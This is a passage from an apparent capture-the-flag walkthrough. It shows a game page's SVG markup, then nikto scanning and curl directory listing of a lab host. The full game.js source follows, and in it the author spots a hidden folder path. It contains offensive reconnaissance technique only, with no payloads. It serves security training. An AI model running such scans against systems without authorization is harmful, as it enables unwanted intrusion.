                     -1.163,-2.1605, -0.2327,-2.5422, 0.3352,-3.2319
                     -1.4432,-0.2307, -0.4485,-0.83498, -0.0527,-1.9151
                     -1.2304,-0.5137, -1.6742,-1.4126, -1.2459,-2.7388
                     -0.9898,1.2593, -0.9672,-0.606, -1.131,-1.896
                     -0.51549,1.084, -0.9993,2.4142, -1.8584,0.82793
                     -0.92276,2.4614, -1.531,0.17894, -1.9087,-1.2819
                   z;
  
                   m -28.703,-29.65
                   c  3.1162,7.1472, 14.884,15.283, 22.145,4.0018
                      9.3018,4.1406, 15.117,3.6386, 20.494,-2.965
                     -0.43617,6.3017, 1.2104,9.7538, 9.3191,10.168
                     -1.1493,8.2598, 8.8612,12.047, 15.265,10.868
                     -11.198,5.4215, -5.657,7.4156, -1.8,11.045,-8.648
                      2.1575,-7.92, 6.5469,-2.759, 11.991,-10.048
                     -0.531,-15.201, 2.881,-12.404, 12.698,-7.203
                     -3.88,-15.32, -3.284,-18.716, 7.706,-2.0291
                     -6.803,-5.7675, -15.598,-16.779, -6.888,-6.1392
                     -11.865,-11.711, -4.2781,-17.378, 0.0251,1.3326
                     -5.1012,0.91647, -8.8704,-7.5468, -6.5096,5.6288
                     -4.7623,12.722, -9.931,-0.52467, -17.564,5.6568
                     -10.149,0.22658, -12.697,-6.2829, -14.505,8.5128
                     -5.8277,6.2399, -11.655,3.6145, -17.483,6.5728
                      6.4104,11.707, 7.888,13.353, -2.5888
                   z
                   m -1.8891,-9.146
                   c  0.9281,12.155, -7.3194,10.581, -16.623,7.4278
                      6.8723,12.346, 0.4184,17.172, -5.7132,22.181
                      16.358,3.954, 12.037,11.6, 4.9844,19.733
                      17.367,-2.7187, 12.68,4.884, 1.0493,15.737
                      8.4809,-0.78413, 13.776,-1.6578, 12.764,9.3027
                      5.9945,-6.1707, 16.771,-14.287, 18.454,5.9344
                      8.7251,-16.338, 13.519,-7.8198, 18.626,1.7233
                      4.4356,-8.384, 10.119,-16.798, 23.349,-7.968
                     -2.458,-10.692, -1.566,-18.955, 16.527,-14.738
                     -14.567,-12.524, -2.916,-14.736, 4.197,-18.734
                     -18.076,-1.3376, -5.617,-4.8404, -0.66,-11.102
                     -15.41,-2.9776, -20.969,-8.1886, -15.605,-15.876
                     -12.398,7.2993, -12.115,-3.5128, -14.166,-10.991
                     -6.4567,6.2837, -12.517,13.994, -23.277,4.7992
                     -11.558,14.268,-19.177,1.0372,-23.907,-7.4309
                   z" />
      </path>
    </svg>
  
  <!--== HUD ==================================================================-->
    <g id="hud"
       visibility="hidden" >
      <svg preserveAspectRatio="xMinYMid meet" viewBox="0 0 0.1 1">
        <g transform="translate(0.02, 0.98), scale(0.15,-0.15)">
        <!-- Radar Scope -->
          <g>
            <circle
               class="hud-background"
               cx="0.5"
               cy="0.5"
               r="0.5" />
            <circle id="hud-radar-scope-missile-target"
               clip-path="url(#hud-radar-scope-clip-path)"
               fill="#777777"
               stroke="none"
               r="0.04"
                cx="0.5" cy="0.5" />
            <circle
               id="hud-radar-scope-missile"
               clip-path="url(#hud-radar-scope-clip-path)"
               fill="#111111"
               stroke="none"
               r="0.04" />
            <circle
               class="hud-foreground"
               stroke-width="0.04"
               cx="0.5"
               cy="0.5"
               r="0.5" />
            <clipPath
               id="hud-radar-scope-clip-path" >
              <circle
                 cx="0.5"
                 cy="0.5"
                 r="0.5" />
            </clipPath>
          </g>
        <!-- Speedometer-->
          <g>
            <g
               transform="translate(1.1,0.1), scale(1.8,1.8)">
              <rect
                 class="hud-background"
                 width="1.0"
                 height="0.122" />
  
              <rect id="hud-speedometer-bar"
                 clip-path="url(#hud-speedometer-bar-clip-path)"
                 fill="#333333"
                 stroke="none"
                 x="-0.5"
                 width="1.0"
                 height="0.122" />
  
              <rect
                 class="hud-foreground"
                 stroke-width="0.02"
                 width="1.0"
                 height="0.122" />
  
              <clipPath id="hud-speedometer-bar-clip-path">
                <rect
                   width="0.5"
                   height="0.122" />
              </clipPath>
            </g>
  
            <text id="hud-speedometer-label-text"
               transform="translate(1.2, 0.4), scale(0.012,-0.012)">SPEED</text>
  
            <text id="hud-speedometer-speed-text"
               transform="translate(3, 0.1), scale(0.02,-0.02)" />
  
            <clipPath
               id="speedometer-clip-path" >
              <rect
                 x="1.1"
                 y="0.1"
                 width="1.8"
                 height="0.22" />
            </clipPath>
          </g>
  
        <!-- Lives Indicator ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
          <g>
            <defs>
              <g id="hud-lives-indicator-missile"
                 transform="rotate(-65), translate(0,-0.5), scale(0.6,0.6)">
                <path
                   style="fill:white; stroke: black; stroke-linejoin:round;"
                   stroke-width="0.04"
                   d="m -0.07, 0.01
                      L -0.2, -0.07
                      L  0.0,  0.6
                      L  0.2, -0.07
                      L  0.07, 0.01" />
                <path
                   fill="white"
                   stroke="black"
                   stroke-width="0.04"
                   d="m -0.07, 0.0
                      C -0.12, 0.4 -0.12,0.8  0.0,  1.0
                      C  0.12, 0.8  0.12,0.4  0.07, 0.0
                      z" />
              </g>
            </defs>
            <use id="hud-lives-indicator-missile-1"
               transform="translate(0.6,1.4)"
               visibility="hidden"
               xlink:href="#hud-lives-indicator-missile" />
            <use id="hud-lives-indicator-missile-2"
               transform="translate(0.6,1.7)"
               visibility="hidden"
               xlink:href="#hud-lives-indicator-missile" />
            <use id="hud-lives-indicator-missile-3"
               transform="translate(0.6,2.0)"
               visibility="hidden"
               xlink:href="#hud-lives-indicator-missile" />
            <use id="hud-lives-indicator-missile-4"
               transform="translate(0.6,2.3)"
               visibility="hidden"
               xlink:href="#hud-lives-indicator-missile" />
            <use id="hud-lives-indicator-missile-5"
               transform="translate(0.6,2.6)"
               visibility="hidden"
               xlink:href="#hud-lives-indicator-missile" />
  
            <g id="hud-lives-indicator-infinite"
                 visibility="hidden"
                 transform="translate(0.5,1.5)">
              <use
                 transform="translate(0.3,0.15), scale(1.4,1.4)"
                 xlink:href="#hud-lives-indicator-missile" />
              <path
                 stroke="white"
                 stroke-width="0.02"
                 stroke-opacity="0.2"
                 d="m  0.0, 0.04
                    C  0.5, 0.5  0.5,-0.5  0.0,-0.04
                    C -0.5,-0.5 -0.5, 0.5  0.0, 0.04
                    M  0.035, 0.0
                    C  0.43,-0.4  0.43, 0.4  0.035, 0.0
                    M  -0.035, 0.0
                    C  -0.43, 0.4 -0.43,-0.4 -0.035, 0.0" />
            </g>
  
            <g id="hud-lives-indicator-none"
                 visibility="visible"
                 transform="translate(0.5,1.5)">
              <use
                 transform="translate(0.3,0.15), scale(1.4,1.4)"
                 xlink:href="#hud-lives-indicator-missile" />
              <path
                 transform="scale(0.8,0.8)"
                 stroke="white"
                 stroke-width="0.02"
                 stroke-opacity="0.2"
                 d="M  0.0, 0.4
                    A  0.4, 0.4  0 0,0  0.4, 0.0
                    A  0.4, 0.4  0 0,0  0.0,-0.4
                    A  0.4, 0.4  0 0,0 -0.4, 0.0
                    A  0.4, 0.4  0 0,0  0.0, 0.4
                    z
                    M  0.26,-0.20
                    A  0.328,0.328, 0 0,1 -0.20,0.26
                    z
                    M  -0.26,0.20
                    A  0.328,0.328, 0 0,1 0.20,-0.26
                    z" />
            </g>
  
  
          </g>
        </g>
  
      <!-- Level Indicator ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
        <text id="hud-level-indicator"
           transform="translate(0.035, 0.035), scale(0.0025,0.0025)" />
  
      <!-- Frame Rate Indicator ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
        <text id="hud-frame-rate-indicator"
           transform="translate(0.035, 0.08), scale(0.0025,0.0025)"
           fill="#333333" />
  
      </svg>
  
  
      <svg preserveAspectRatio="xMaxYMid meet" viewBox="0 0 0.06 1">
      <!-- Progress Indicator ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
        <g
          transform="translate(0,0.965), scale(0.95,-0.95)">
  
          <path
             stroke="#333333"
             stroke-width="0.0005"
             fill="white"
             opacity="0.8"
             d="M  0.03   0.0
                l -0.04   0.0
                  -0.005  0.005
                   0.0    0.26
                   0.02   0.02
                   0.0    0.72
                   0.025  0
                z" />
  
          <text opacity="0.8" transform="translate(0.024,0.01), rotate(90), scale(0.0026,-0.0026)">PROGRESS</text>
  
          <g id="hud-progress-indicator-best-progress"
             transform="translate(0,0.2)">
            <rect
               x="-0.01"
               width="0.04"
               height="0.008"
               fill="#777777" />
            <text
               fill="#777777"
               transform="translate(-0.04,-0.002), scale(0.001,-0.001)">PB</text>
          </g>
  
          <g id="hud-progress-indicator-progress"
             transform="translate(0,0.2)">
            <rect
               x="-0.01"
               width="0.04"
               height="0.008"
               fill="#333333" />
          </g>
  
          <path
             class="hud-foreground"
             stroke-width="0.006"
             d="m 0, 1.005
                L 0.03, 1.005
                  0.03, 0
                  0, 0" />
        </g>
      </svg>
    </g>
  
  <!--== FOG ==================================================================-->
    <rect id="fog"
      width="100%" height="100%"
      fill="white"
      opacity="1" />
  
  <!--== BANNER ===============================================================-->
    <svg id="banner"
       width="130%" height="100%"
       preserveAspectRatio="xMaxYMid meet"
       viewBox="0 0 0.01 1"
       overflow="visible"
       visibility="hidden" >
      <rect
         x="-0.1" y="0.45"
         width="6" height="0.2"
         fill="#000"
         opacity="0.95"
         stroke-linejoin="round"
         stroke-linecap="round"
         stroke-width="0.005" />
  
      <g transform="translate(-0.05,0.54) scale(0.004,0.004)">
        <text id="banner-title"
           fill="#fff" ></text>
      </g>
      <g transform="translate(0.25,0.6) scale(0.0025,0.0025)">
        <text id="banner-text"
           fill="#ccc" ></text>
      </g>
    </svg>
  
  
    <defs>
  
  <!--== BARRIER PATHS ========================================================-->
      <path
         id="barrier-path-1"
         d="M 100,0
            A 100,100 0 0,1 0,100
            A 100,100 0 0,1 -100,0
            A 100,100 0 0,1 0,-100
            A 100,100 0 0,1 100,0
            z
  
            M 0,90
            A 90,90 0 0,0 90,0
            L 30,0
            A 30,30 0 0,1 0,30
            z
  
            M 0,-90
            A 90,90 0 0,0 -90,0
            L -30,0
            A 30,30 0 0,1 0,-30
            z" />
  
      <path
         id="barrier-path-2"
         d="M 100,0
            A 100,100 0 0,1  0,   100
            A 100,100 0 0,1 -100, 0
            A 100,100 0 0,1  0,  -100
            A 100,100 0 0,1  100, 0
            z
  
            M 80,0
            A 30,30 0 0,0  50,-30
            A 30,30 0 0,0  20, 0
            A 30,30 0 0,0  50, 30
            A 30,30 0 0,0  80, 0
            z
  
  
            M 5,-43.3
            A 30,30 0 0,0 -25, -73.3
            A 30,30 0 0,0 -55, -43.3
            A 30,30 0 0,0 -25, -13.3
            A 30,30 0 0,0  5,  -43.3
            z
  
  
            M 5,43.3
            A 30,30 0 0,0 -25, 13.3
            A 30,30 0 0,0 -55, 43.3
            A 30,30 0 0,0 -25, 73.3
            A 30,30 0 0,0  5,  43.3
            z" />
  
      <path
         id="barrier-path-3"
         d="M 100,0
            A 100,100 0 0,1  0,   100
            A 100,100 0 0,1 -100, 0
            A 100,100 0 0,1  0,  -100
            A 100,100 0 0,1  100, 0
            z
  
            M 0,90
            A 90,90 0 0,0 90,0
            L 30,0
            A 30,30 0 0,0  0, -30
            A 30,30 0 0,0 -30, 0
            A 30,30 0 0,0  0,  30
            z" />
  
      <path
         id="barrier-path-4"
         d="M 100,0
            A 100,100 0 0,1  0,   100
            A 100,100 0 0,1 -100, 0
            A 100,100 0 0,1  0,  -100
            A 100,100 0 0,1  100, 0
            z
  
            M -30.78,84.57
            A 90,90 0 0,0 90,0
            L 30,0
            A 30,30 0 0,1 -10.26,28.19
            z" />
  
      <path
         id="barrier-path-5"
         d="M 100,0
            A 100,100 0 0,1  0,   100
            A 100,100 0 0,1 -100, 0
            A 100,100 0 0,1  0,  -100
            A 100,100 0 0,1  100, 0
            z
  
            M 45,77.94
            A 90,90 0 0,0 45,-77.94
            L 45,-45
            A 58,58 0 0,0 45,45
            z
  
            M -45,-77.94
            A 90,90 0 0,0 -45,77.94
            L -45,45
            A 58,58 0 0,0 -45,-45
            z" />
  
      <path
         id="barrier-path-6"
         d="M 100,0
            A 100,100 0 0,1  0,   100
            A 100,100 0 0,1 -100, 0
            A 100,100 0 0,1  0,  -100
            A 100,100 0 0,1  100, 0
            z
  
            M  80, 25
            L  80,-25
            L -80,-25
            L -80, 25
            z" />
  
      <path
         id="barrier-path-blank"
         d="M 100,0
            A 100,100 0 0,1  0,   100
            A 100,100 0 0,1 -100, 0
            A 100,100 0 0,1  0,  -100
            A 100,100 0 0,1  100, 0
            z
  
            M 90,0
            A 90,90 0 0,0  0, -90
            A 90,90 0 0,0 -90, 0
            A 90,90 0 0,0  0,  90
            A 90,90 0 0,0  90, 0
            z" />
  
      <path
         id="barrier-path-finish"
         d="M 100,0
            A 100,100 0 0,1  0,   100
            A 100,100 0 0,1 -100, 0
            A 100,100 0 0,1  0,  -100
            A 100,100 0 0,1  100, 0
            z
  
            M 90,0
            A 90,90 0 0,0  -63.63,  -63.63
            L -53.03,-53.03
            A 75,75 0 0,0  -75,0
            L -90,0
            A 90,90 0 0,0  63.63,63.63
            L 53.03,53.03
            A 75,75 0 0,0  75,0
            z" />
  
  
  <!-- Collision Detection -->
      <line
         id="collision-line"
         x1="-300"
         y1="100"
         x2="100"
         y2="100" />
    </defs>
  </svg>


  <!--== SCRIPTS ==============================================================-->
  
  <!-- Kevin Lindsey's 2d geometry SVG library -->
  <script type="application/javascript" src="lib/kevlindev/2D.js"></script>
  <script type="application/javascript" src="lib/kevlindev/Path.js"></script>
  
  <!-- Game files -->
  <script type="application/javascript" src="src/base.js"></script>
  <script type="application/javascript" src="src/util.js"></script>
  <script type="application/javascript" src="src/missile.js"></script>
  <script type="application/javascript" src="src/wall.js"></script>
  <script type="application/javascript" src="src/barrier.js"></script>
  <script type="application/javascript" src="src/barrierQueue.js"></script>
  <script type="application/javascript" src="src/game.js"></script>
  <script type="application/javascript" src="src/hud.js"></script>
  <script type="application/javascript" src="src/banner.js"></script>
  <script type="application/javascript" src="src/fog.js"></script>
  <script type="application/javascript" src="src/main.js"></script>
 
</body>
</html>
root@kali:~# 

```

It's already evident at this point, by let's fuzz the site main folder, we are in particular attracted by the game.js file

```bash

root@kali:~# nikto -C all -h http://g4m35.ctf
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.1.167
+ Target Hostname:    g4m35.ctf
+ Target Port:        80
+ Start Time:         2017-04-27 08:43:58 (GMT2)
---------------------------------------------------------------------------
+ Server: Apache
+ Server leaks inodes via ETags, header found with file /, fields: 0x58e9 0x54c31dafa6266 
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Allowed HTTP Methods: OPTIONS, GET, HEAD, POST 
+ OSVDB-3268: /lib/: Directory indexing found.
+ OSVDB-3092: /lib/: This might be interesting...
+ OSVDB-3268: /src/: Directory indexing found.
+ OSVDB-3092: /manual/: Web server manual found.
+ OSVDB-3268: /manual/images/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 26075 requests: 0 error(s) and 11 item(s) reported on remote host
+ End Time:           2017-04-27 08:44:56 (GMT2) (58 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
root@kali:~# curl http://g4m35.ctf/lib
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>301 Moved Permanently</title>
</head><body>
<h1>Moved Permanently</h1>
<p>The document has moved <a href="http://g4m35.ctf/lib/">here</a>.</p>
</body></html>
root@kali:~# curl http://g4m35.ctf/lib/
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html>
 <head>
  <title>Index of /lib</title>
 </head>
 <body>
<h1>Index of /lib</h1>
  <table>
   <tr><th valign="top"><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=D">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=A">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr>
   <tr><th colspan="5"><hr></th></tr>
<tr><td valign="top"><img src="/icons/back.gif" alt="[PARENTDIR]"></td><td><a href="/">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/folder.gif" alt="[DIR]"></td><td><a href="kevlindev/">kevlindev/</a></td><td align="right">2017-04-02 17:51  </td><td align="right">  - </td><td>&nbsp;</td></tr>
   <tr><th colspan="5"><hr></th></tr>
</table>
</body></html>
root@kali:~# curl http://g4m35.ctf/src/
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html>
 <head>
  <title>Index of /src</title>
 </head>
 <body>
<h1>Index of /src</h1>
  <table>
   <tr><th valign="top"><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=D">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=A">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr>
   <tr><th colspan="5"><hr></th></tr>
<tr><td valign="top"><img src="/icons/back.gif" alt="[PARENTDIR]"></td><td><a href="/">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="banner.js">banner.js</a></td><td align="right">2017-04-02 17:51  </td><td align="right">2.3K</td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="barrier.js">barrier.js</a></td><td align="right">2017-04-02 17:51  </td><td align="right">5.8K</td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="barrierQueue.js">barrierQueue.js</a></td><td align="right">2017-04-02 17:51  </td><td align="right">3.1K</td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="base.js">base.js</a></td><td align="right">2017-04-02 17:51  </td><td align="right">599 </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="fog.js">fog.js</a></td><td align="right">2017-04-02 17:51  </td><td align="right">1.7K</td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="game.js">game.js</a></td><td align="right">2017-04-02 17:51  </td><td align="right"> 12K</td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="hud.js">hud.js</a></td><td align="right">2017-04-02 17:51  </td><td align="right">8.5K</td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="main.js">main.js</a></td><td align="right">2017-04-02 17:51  </td><td align="right">1.7K</td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="missile.js">missile.js</a></td><td align="right">2017-04-02 17:51  </td><td align="right">4.0K</td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="util.js">util.js</a></td><td align="right">2017-04-02 17:51  </td><td align="right">726 </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="wall.js">wall.js</a></td><td align="right">2017-04-02 17:51  </td><td align="right">2.8K</td><td>&nbsp;</td></tr>
   <tr><th colspan="5"><hr></th></tr>
</table>
</body></html>
root@kali:~# curl http://g4m35.ctf/src/game.js
MG.game = (function () {

    /** Constants **/
    var GameState = {
        WAIT_START: 'wait_start',
        STARTING:   'starting',
        RUNNING:    'running',
        FINISHED:   'finished',
        CRASHED:    'crashed'
    }

    var STARTING_LIVES = 5;

    var LEVEL_NUM_BARRIERS = 20;

    /** Variables **/
    var mState = GameState.WAIT_START;

    var mLives = STARTING_LIVES;
    var mLevel = 0;

    var mRemainingBarriers = 0;
    var mBarriersToPass = 0;

    var mProgress = 0.0;
    var mBestProgress = 0.0;

//    XXX AUDIO XXX
//    var NUM_WOOSH_INSTANCES = 3;
//    var mWoosh = [];
//    var mLastWoosh = 0;
//    var mWooshPlaying = false;


    /* Strings for UI ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/

    var getLevelString = function () {
        return mLevel ? 'LEVEL ' + mLevel : 'QUALIFYING LEVEL';
    }

    var Messages = {
        START: {
            title: getLevelString,
            text:  function () {return 'CLICK TO BEGIN';}
        },
        CRASH: {
            title: function () {return 'CRASHED';},
            text:  function () {return 'CLICK TO RETRY';}
        },
        GAME_OVER: {
            title: function () {return '/H3x6L64m3';},
            text:  function () {return 'CLICK TO START AGAIN';}
        },
        FINISH: {
            title: function () {return 'LEVEL COMPLETED';},
            text:  function () {return 'CLICK TO CONTINUE';}
        }
    };



    var getLevelStartVelocity   = function (level) {
        return 300 + 100*level;
    }

    var getLevelFinishVelocity  = function (level) {
        return 400 + 100*level;
    }

    var getPreLevelIdleVelocity = function (level) {
        return 350 + 100*level;
    }

    var getPostLevelIdleVelocity = function (level) {
        return 550 + 100*level;
    }

    var playCrashAnimation = function () {
        // TODO move drawing out of the update loop

        // create a copy of the explosion element
        var explosion = document.getElementById('explosion');

        // play the animation
        explosion.firstChild.beginElement();
        explosion.setAttribute('visibility', 'visible');

        // TODO can't seem to get a callback to fire when the animation
        // finishes. Use timeout instead
        setTimeout(function (){
            var explosion = document.getElementById('explosion');
            explosion.setAttribute('visibility', 'hidden');
        }, 400);
    }

    var goWaitStartLevel = function () {
        MG.banner.show(Messages.START.title(), Messages.START.text());
        MG.util.showMouse();

        MG.missile.setAutopilot();
        MG.missile.setVelocity(getPreLevelIdleVelocity(mLevel));

        if (mLevel === 0) {mLives = Infinity;}

        mState = GameState.WAIT_START;
    }

    /**
     *
     */
    var goRun = function () {
        MG.banner.hide();
        MG.util.hideMouse();

        /* TODO should the start barrier be pushed here?
        If so, should all of the barriers for the entire level be pushed as well? */
        mRemainingBarriers = LEVEL_NUM_BARRIERS;
        MG.barrierQueue.pushBarrier(MG.BarrierType.START);

        mBarriersToPass = LEVEL_NUM_BARRIERS;

        MG.missile.setManual();

        mState = GameState.STARTING;
    }

    var goFinish = function () {
        MG.banner.show(Messages.FINISH.title(), Messages.FINISH.text());
        MG.util.showMouse();

        MG.missile.setAutopilot();
        MG.missile.setVelocity(getPostLevelIdleVelocity(mLevel));

        mState = GameState.FINISHED;
    }

    var goCrash = function () {
        MG.util.showMouse();

        if (mLives === 0) {
            MG.banner.show(Messages.GAME_OVER.title(), Messages.GAME_OVER.text());
        } else {
            MG.banner.show(Messages.CRASH.title(), Messages.CRASH.text());
        }

        playCrashAnimation()

        mState = GameState.CRASHED;

    }


    //==========================================================================

    return {
        init: function () {
            var rootNode = document.getElementById('tunnel');

            MG.missile.init();

            //

            var wallNode;

            wallNode = document.createElementNS(NAMESPACE_SVG, 'g');
            wallNode.setAttribute('transform', 'scale(1,-1)');

            MG.tunnelWall.init(wallNode);

            rootNode.appendChild(wallNode);

            //

            var barrierQueueNode;

            barrierQueueNode = document.createElementNS(NAMESPACE_SVG, 'g');
            barrierQueueNode.setAttribute('transform', 'scale(1,-1)');

            MG.barrierQueue.init(barrierQueueNode);

            rootNode.appendChild(barrierQueueNode);

            //

//            XXX AUDIO XXX
//            for (var i=0; i<NUM_WOOSH_INSTANCES; i++) {
//                mWoosh[i] = new Audio("woosh2.mp3");
//            }

            //

            goWaitStartLevel();

            rootNode.setAttribute('visibility', 'visible');
        },


        update: function (dt) {
            MG.missile.update(dt);    
            MG.tunnelWall.update(dt);
            MG.barrierQueue.update(dt);    
//            XXX AUDIO XXX
//            if (MG.missile.getOffset()/MG.missile.getVelocity() < 0.8 && mWooshPlaying === false && mState !== GameState.CRASHED) {
//                mWooshPlaying = true;
////                var woosh = document.getElementById('woosh-sound').cloneNode(true);
////                woosh.setAttribute('autoplay', 'autoplay');
//                mLastWoosh++;
//                mLastWoosh = mLastWoosh == NUM_WOOSH_INSTANCES ? 0 : mLastWoosh;
//                
//                mWoosh[mLastWoosh].play();
//            }


            /* check whether the nearest barrier has been reached and whether the missile collides with it. */
            if (!MG.barrierQueue.isEmpty()) {
                if (MG.missile.getOffset() < MG.MISSILE_LENGTH && !MG.missile.isCrashed()){
                    var barrier = MG.barrierQueue.nextBarrier();

                    if (barrier.collides(MG.missile.getPosition().x, MG.missile.getPosition().y)) {
                        // CRASH
                        MG.missile.onCrash();
                        goCrash();
                    } else {

                        // BARRIER PASSED
                        MG.barrierQueue.popBarrier();
                        MG.missile.onBarrierPassed();

//                        XXX AUDIO XXX
//                        mWooshPlaying = false;

                        // TODO this block makes loads of assumptions about state
                        if (mState === GameState.RUNNING
                         || mState === GameState.STARTING) {
                            switch(barrier.getType()) {
                              case MG.BarrierType.FINISH:
                                goFinish();
                                break;
                              case MG.BarrierType.BLANK:
                                break;
                              case MG.BarrierType.START:
                                mState = GameState.RUNNING;
                                // FALLTHROUGH
                              default:
                                mBarriersToPass--;

                                var startVelocity = getLevelStartVelocity(mLevel);
                                var finishVelocity = getLevelFinishVelocity(mLevel);

                                MG.missile.setVelocity(startVelocity
                                                         + (startVelocity - finishVelocity)
                                                           * (mBarriersToPass - LEVEL_NUM_BARRIERS)
                                                             / LEVEL_NUM_BARRIERS);
                                break;
                            }
                        }
                    }
                }    
            }

        
            /* Pad the barrier queue with blank barriers so that there are barriers
            as far as can be seen. */
            while (MG.barrierQueue.numBarriers() < MG.LINE_OF_SIGHT/MG.BARRIER_SPACING) {
                var type = MG.BarrierType.BLANK;
    
                if (mState === GameState.RUNNING
                 || mState === GameState.STARTING) {
                    mRemainingBarriers--;
                    if (mRemainingBarriers > 0) {
                        type = MG.BarrierType.RANDOM;
                    } else if (mRemainingBarriers === 0) {
                        type = MG.BarrierType.FINISH;
                    } else {
                        type = MG.BarrierType.BLANK;
                    }
                }
    
                MG.barrierQueue.pushBarrier(type);
            }

            /* Update progress */
            switch (mState) {
              case GameState.RUNNING:
                mProgress = 1 - (mBarriersToPass*MG.BARRIER_SPACING + MG.missile.getOffset())/(LEVEL_NUM_BARRIERS * MG.BARRIER_SPACING);
                mBestProgress = Math.max(mProgress, mBestProgress);
                break;
              case GameState.FINISHED:
                mProgress = 1;
                mBestProgress = 1;
                break;
              case GameState.STARTING:
                mProgress = 0;
                break;
              default:
                break;
            }

        },

        updateDOM: function () {
            var position = MG.missile.getPosition();
            var offset = MG.missile.getOffset();

            MG.barrierQueue.updateDOM(-position.x, -position.y, offset);
            MG.tunnelWall.updateDOM(-position.x, -position.y, offset);
        },

        onMouseMove: function (x, y) {
            var windowWidth = window.innerWidth;
            var windowHeight = window.innerHeight;

            MG.missile.setTarget(x - 0.5*windowWidth, -(y - 0.5*windowHeight));

        },

        onMouseClick: function () {
            if (MG.banner.isFullyVisible()) {
                switch (mState) {
                  case GameState.WAIT_START:
                    goRun();
                    break;
                  case GameState.FINISHED:
                    /* The player is given an infinite number of lives
                    during the qualifying level but these should be
                    removed before continuing. */
                    if (mLevel === 0) {mLives = STARTING_LIVES;}

                    mLevel++;

                    mBestProgress = 0.0;

                    goWaitStartLevel();
                    break;
                  case GameState.CRASHED:
                    MG.banner.hide();
                    MG.fog.fadeIn(function() {
                            if (mLives === 0) {
                                mLevel = 0;
                                mLives = STARTING_LIVES;
                                mBestProgress = 0.0;
                            } else {
                                mLives--;
                            }


                            MG.missile.reset();
                            MG.barrierQueue.reset();

                            MG.fog.fadeOut();
                            goWaitStartLevel();
                        });
                    break;
                }
            }
        },

        /* Returns an integer representing the current level */
        getLevel: function () {
            return mLevel;
        },

        /* Returns a human readable string describing the current level */
        getLevelString: getLevelString,

        /* Returns the number of times the player can crash before game over. */
        /* If the player crashes with zero lives remaining the game ends */
        getNumLives: function () {
            return mLives;
        },

        /* Returns the progress through the level as a value between 0 and 1,
        where 0 is not yet started and 1 is completed. */
        getProgress: function () {
            return mProgress;       
        },

        getBestProgress: function () {
            return mBestProgress;
        }
    };



}());

root@kali:~# 

```

In this file we notice at some point that in case of Game Over there is a particular string /H3x6L64m3 that looks promising as folder. Let's fuzz it with nikto, dirb, gobuster

```bash

root@kali:~# curl http://g4m35.ctf/H3x6L64m3/
<!doctype html>
<html lang="en">
  <head>
    <title>HexGL by BKcore</title>
    <meta charset="utf-8">
    <meta name="description" content="HexGL is a futuristic racing game built by Thibaut Despoulain (BKcore) using HTML5, Javascript and WebGL. Come challenge your friends on this fast-paced 3D game!">
    <meta property="og:title" content="HexGL, the HTML5 futuristic racing game." />
    <meta property="og:type" content="game" />
    <meta property="og:url" content="http://hexgl.bkcore.com/" />
    <meta property="og:image" content="http://hexgl.bkcore.com/image.png" />
    <meta property="og:site_name" content="HexGL by BKcore" />
    <meta property="fb:admins" content="1482017639" />
    <link rel="icon" href="http://hexgl.bkcore.com/favicon.png" type="image/png">
    <link rel="shortcut icon" href="http://hexgl.bkcore.com/favicon.png" type="image/png">
    <meta name="viewport" content="width=device-width, user-scalable=no, minimum-scale=1.0, maximum-scale=1.0">
    <link rel="stylesheet" href="css/multi.css" type="text/css" charset="utf-8">
    <link rel="stylesheet" href="css/fonts.css" type="text/css" charset="utf-8">
    <style>
      body {
        padding:0;
        margin:0;
      }
      canvas { pointer-events:none; width: 100%;}
      #overlay{
        position: absolute;
        z-index: 9999;
        top: 0;
        left: 0;
        width: 100%;
      }
    </style>
    <script type="text/javascript">
    //analytics
    var _gaq = _gaq || [];
